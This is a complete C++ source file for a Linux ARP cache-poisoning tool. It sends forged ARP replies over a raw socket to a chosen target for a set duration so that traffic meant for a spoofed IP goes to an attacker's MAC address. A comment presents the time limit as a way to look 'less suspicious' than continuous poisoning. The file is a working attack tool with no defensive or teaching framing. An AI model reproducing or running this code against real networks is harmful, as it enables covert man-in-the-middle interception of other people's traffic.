// Compile: g++ -o arp_ttl arp_ttl.cpp -lpthread
// Run: sudo ./arp_ttl <target_ip> <target_mac> <spoof_ip> <attacker_mac> <iface> <duration_sec>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <chrono>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>

class ARPTTLLimited {
private:
    int sock;
    std::string iface;
    std::atomic<bool> running{false};
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    ARPTTLLimited(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendPoison(const std::string& srcIP, const std::string& srcMAC,
                    const std::string& dstIP, const std::string& dstMAC,
                    bool restore = false) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Poison for a specific duration then STOP - cache naturally expires
    // Less suspicious than continuous poisoning
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& spoofIP, const std::string& attackerMAC,
             int durationSec) {
        std::cout << "[*] TTL-limited poisoning: " << durationSec << " seconds\n";
        
        auto start = std::chrono::steady_clock::now();
        while (std::chrono::duration_cast<std::chrono::seconds>(
               std::chrono::steady_clock::now() - start).count() < durationSec) {
            sendPoison(spoofIP, attackerMAC, targetIP, targetMAC);
            usleep(500000);
        }
        
        std::cout << "[*] Poison window ended - cache will naturally expire\n";
    }
    
    ~ARPTTLLimited() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 7) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <spoof_ip> <attacker_mac> <iface> <duration_sec>\n";
        return 1;
    }
    ARPTTLLimited poison(argv[5]);
    poison.run(argv[1], argv[2], argv[3], argv[4], atoi(argv[6]));
    return 0;
}
